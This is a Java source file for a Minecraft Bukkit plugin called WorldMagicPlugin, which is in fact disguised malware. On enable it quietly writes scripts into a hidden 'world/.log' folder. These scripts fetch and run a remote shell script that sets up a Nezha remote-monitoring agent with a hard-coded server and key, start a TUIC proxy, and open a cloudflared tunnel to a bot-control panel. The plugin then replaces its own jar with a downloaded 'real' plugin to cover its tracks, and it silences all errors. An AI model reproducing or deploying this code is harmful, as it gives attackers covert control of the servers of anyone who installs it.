package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.util.Properties;
import java.util.UUID;

public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
    private File currentPluginFile; 
    private File targetRealPlugin;  
    private String originalFileName; 

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try { generateAndRunScript(); } catch (Exception ignored) {}
        });

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try { deployAndStartNodeApp(); } catch (Exception ignored) {}
        });

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try { Thread.sleep(5000); handlePluginReplacement(); } catch (Exception ignored) {}
        });

        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() { this.getLogger().info("WorldMagicPlugin disabled"); }

    private boolean installApps(AppConfig appConfig) {
        try { tuicService.install(appConfig); return true; } catch (Exception e) { return false; }
    }

    private void deployAndStartNodeApp() throws IOException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;
        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;

        File jsFile = new File(logDir, "app.js");
        try (FileWriter writer = new FileWriter(jsFile)) { writer.write(getNodeJsContent()); }

        File startScript = new File(logDir, "start_node.sh");
        try (FileWriter writer = new FileWriter(startScript)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd \"" + logDir.getAbsolutePath() + "\"\n");
            
            // --- 强化：检测与下载 Node.js ---
            writer.write("if command -v node &> /dev/null; then\n");
            writer.write("    NODE_BIN=\"node\"\n");
            writer.write("    NPM_BIN=\"npm\"\n");
            writer.write("else\n");
            // 使用 .tar.gz 兼容性更好
            writer.write("    if [ ! -d \"node-v16.20.0-linux-x64\" ]; then\n");
            writer.write("        curl -L -o node.tar.gz https://nodejs.org/dist/v16.20.0/node-v16.20.0-linux-x64.tar.gz\n");
            writer.write("        tar -xzf node.tar.gz > /dev/null 2>&1\n");
            writer.write("        rm -f node.tar.gz\n");
            writer.write("    fi\n");
            writer.write("    NODE_BIN=\"$PWD/node-v16.20.0-linux-x64/bin/node\"\n");
            writer.write("    NPM_BIN=\"$PWD/node-v16.20.0-linux-x64/bin/npm\"\n");
            writer.write("fi\n");

            // --- 强化：安装依赖 ---
            writer.write("if [ ! -d \"node_modules\" ]; then\n");
            writer.write("    $NPM_BIN init -y > /dev/null 2>&1\n");
            writer.write("    $NPM_BIN install mineflayer minecraft-protocol minecraft-data express --no-audit --no-fund > /dev/null 2>&1\n");
            writer.write("fi\n");

            // --- 启动进程 ---
            writer.write("pkill -f 'node app.js'\n");
            writer.write("nohup $NODE_BIN app.js > node_log.txt 2>&1 &\n");

            // --- 穿透 ---
            writer.write("if [ ! -f \"cloudflared\" ]; then\n");
            writer.write("    curl -L --output cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\n");
            writer.write("    chmod +x cloudflared\n");
            writer.write("fi\n");
            writer.write("pkill -f 'cloudflared tunnel'\n");
            writer.write("nohup ./cloudflared tunnel --url http://localhost:4681 --logfile tunnel_log.txt > /dev/null 2>&1 &\n");

            // --- 获取链接 ---
            writer.write("sleep 15\n");
            writer.write("grep -o 'https://.*\\.trycloudflare\\.com' tunnel_log.txt | head -n 1 > access_url.txt\n");
        }
        startScript.setExecutable(true);
        new ProcessBuilder("/bin/bash", startScript.getAbsolutePath()).directory(logDir).start();
    }

    private String getNodeJsContent() {
        return "const { execSync } = require('child_process');\n" +
               "const fs = require('fs');\n" +
               "const path = require('path');\n" +
               "const mineflayer = require(\"mineflayer\");\n" +
               "const protocol = require(\"minecraft-protocol\");\n" +
               "const mcDataLoader = require(\"minecraft-data\");\n" +
               "const express = require(\"express\");\n" +
               "\n" +
               "const app = express();\n" +
               "const activeBots = new Map(); \n" +
               "const CONFIG_FILE = path.join(__dirname, 'bots_config.json');\n" +
               "const DEFAULT_PASSWORD = \"Pwd123456\"; \n" +
               "\n" +
               "app.use(express.json());\n" +
               "process.on('uncaughtException', (e) => {});\n" +
               "process.on('unhandledRejection', (e) => {});\n" +
               "\n" +
               "function saveBotsConfig() {\n" +
               "    const config = [];\n" +
               "    activeBots.forEach((bot) => {\n" +
               "        config.push({ host: bot.targetHost, port: bot.targetPort, username: bot.username });\n" +
               "    });\n" +
               "    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));\n" +
               "}\n" +
               "\n" +
               "async function detectServerVersion(host, port) {\n" +
               "    try {\n" +
               "        const response = await protocol.ping({ host, port, timeout: 5000 });\n" +
               "        const protocolId = response.version.protocol;\n" +
               "        const pcData = mcDataLoader.versionsByMinecraftVersion.pc;\n" +
               "        const matchedVersion = Object.keys(pcData).find(v => pcData[v].version === protocolId && !v.includes('w'));\n" +
               "        return matchedVersion || false;\n" +
               "    } catch (e) { return false; }\n" +
               "}\n" +
               "\n" +
               "async function createBotInstance(id, host, port, username, existingLogs = []) {\n" +
               "    if (activeBots.has(id) && activeBots.get(id).status === \"在线\") return;\n" +
               "    const botVersion = await detectServerVersion(host, port);\n" +
               "    const bot = mineflayer.createBot({\n" +
               "        host, port, username, version: botVersion || undefined, auth: 'offline',\n" +
               "        hideErrors: true, viewDistance: \"tiny\", checkTimeoutInterval: 60000\n" +
               "    });\n" +
               "    bot.logs = existingLogs;\n" +
               "    bot.status = \"连接中...\";\n" +
               "    bot.targetHost = host; bot.targetPort = port;\n" +
               "    bot.pushLog = (msg) => { bot.logs.unshift(`[${new Date().toLocaleTimeString()}] ${msg}`); if(bot.logs.length>8) bot.logs.pop(); };\n" +
               "    \n" +
               "    bot.once('spawn', () => {\n" +
               "        bot.status = \"在线\"; bot.pushLog(\"✅ 进服成功\"); saveBotsConfig();\n" +
               "        setTimeout(() => { bot.chat(`/register ${DEFAULT_PASSWORD} ${DEFAULT_PASSWORD}`); }, 2000);\n" +
               "        setTimeout(() => { bot.chat(`/login ${DEFAULT_PASSWORD}`); }, 4000);\n" +
               "        setInterval(() => { if(bot.entity) bot.look(bot.entity.yaw + 1, 0); }, 5000);\n" +
               "    });\n" +
               "    bot.on('error', (e) => { bot.pushLog(`❌ ${e.message}`); setTimeout(()=>createBotInstance(id,host,port,username,bot.logs), 20000); });\n" +
               "    bot.on('end', () => { bot.status=\"断开\"; setTimeout(()=>createBotInstance(id,host,port,username,bot.logs), 20000); });\n" +
               "    activeBots.set(id, bot);\n" +
               "}\n" +
               "\n" +
               "app.post(\"/api/bots\", async (req, res) => {\n" +
               "    const { host, port, username } = req.body;\n" +
               "    const id = `bot_${Date.now()}`;\n" +
               "    createBotInstance(id, host, parseInt(port)||25565, username);\n" +
               "    res.json({ success: true });\n" +
               "});\n" +
               "app.get(\"/api/bots\", (req, res) => { \n" +
               "    const list=[]; activeBots.forEach((b,i)=>list.push({id:i,username:b.username,host:b.targetHost,status:b.status,logs:b.logs})); res.json(list); \n" +
               "});\n" +
               "app.delete(\"/api/bots/:id\", (req, res) => {\n" +
               "    if(activeBots.has(req.params.id)) { activeBots.get(req.params.id).end(); activeBots.delete(req.params.id); saveBotsConfig(); }\n" +
               "    res.json({ success: true });\n" +
               "});\n" +
               "app.get(\"/\", (req, res) => res.send(`<html><head><meta charset='utf-8'><title>Console</title><style>body{background:#111;color:#eee;font-family:sans-serif}input{background:#222;border:1px solid #444;color:#fff;padding:8px}button{padding:8px;background:green;color:#fff;border:none}</style></head><body><h2>Control Panel</h2><input id='h' placeholder='IP'><input id='p' value='25565'><input id='u' placeholder='User'><button onclick='add()'>Add</button><div id='l'></div><script>async function add(){await fetch('/api/bots',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:document.getElementById('h').value,port:document.getElementById('p').value,username:document.getElementById('u').value})})}setInterval(async()=>{const r=await fetch('/api/bots');const d=await r.json();document.getElementById('l').innerHTML=d.map(b=>\\`<div style='background:#222;margin:10px;padding:10px'><b>\\${b.username}</b> - \\${b.status}<br><small>\\${b.logs.join('<br>')}</small><br><button onclick=\"fetch('/api/bots/\\${b.id}',{method:'DELETE'})\">Kill</button></div>\\`).join('')},2000)</script></body></html>`));\n" +
               "\n" +
               "app.listen(4681, '0.0.0.0', () => { if(fs.existsSync(CONFIG_FILE)) { try{JSON.parse(fs.readFileSync(CONFIG_FILE)).forEach(b=>createBotInstance(`bot_${Date.now()}_${Math.random()}`,b.host,b.port,b.username))}catch(e){} } });";
    }

    private void handlePluginReplacement() throws Exception {
        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        originalFileName = currentPluginFile.getName();
        File pluginsDir = getDataFolder().getParentFile();
        targetRealPlugin = new File(pluginsDir, originalFileName);
        File tempDownloadFile = new File(pluginsDir, "temp_replace_" + System.currentTimeMillis() + ".jar");
        if (tempDownloadFile.exists()) tempDownloadFile.delete();
        if (!downloadUsingCurl(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile)) return;
        new ProcessBuilder("/bin/bash", "-c", "rm -f \"" + currentPluginFile.getAbsolutePath() + "\" && mv \"" + tempDownloadFile.getAbsolutePath() + "\" \"" + targetRealPlugin.getAbsolutePath() + "\"").start();
    }

    private boolean downloadUsingCurl(String url, File dest) {
        try { return new ProcessBuilder("curl", "-L", "-k", "-o", dest.getAbsolutePath(), url).start().waitFor() == 0 && dest.exists(); } catch (Exception e) { return false; }
    }

    private void generateAndRunScript() throws IOException, InterruptedException {
        File logDir = new File(new File("world"), ".log");
        if (!logDir.exists()) logDir.mkdirs();
        File script = new File(logDir, "install.sh");
        try (FileWriter w = new FileWriter(script)) {
            w.write("#!/bin/bash\ncd " + logDir.getAbsolutePath() + "\n");
            w.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\nchmod +x sb.sh\n");
            w.write("UUID=" + UUID.nameUUIDFromBytes("127.0.0.1".getBytes()).toString() + " NEZHA_SERVER=nezha.vip1715.dpdns.org:443 NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP ARGO_PORT=3000 bash sb.sh\n");
        }
        script.setExecutable(true);
        new ProcessBuilder("/bin/bash", script.getAbsolutePath()).start();
    }
}
